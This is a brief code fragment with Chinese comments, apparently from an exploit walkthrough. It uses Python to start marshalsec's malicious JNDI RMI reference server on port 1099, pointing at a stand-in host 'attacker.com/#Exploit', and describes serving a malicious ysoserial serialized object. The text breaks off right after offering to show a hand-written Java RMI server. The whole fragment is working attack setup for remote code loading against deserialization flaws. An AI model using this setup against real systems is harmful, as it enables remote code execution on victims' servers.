import subprocess
# 启动RMI服务器，返回一个恶意的序列化对象（使用ysoserial生成）
subprocess.Popen(['java', '-cp', 'marshalsec.jar', 'marshalsec.jndi.RMIRefServer', 'http://attacker.com/#Exploit', '1099'])


或者手动编写Java RMI服务器：
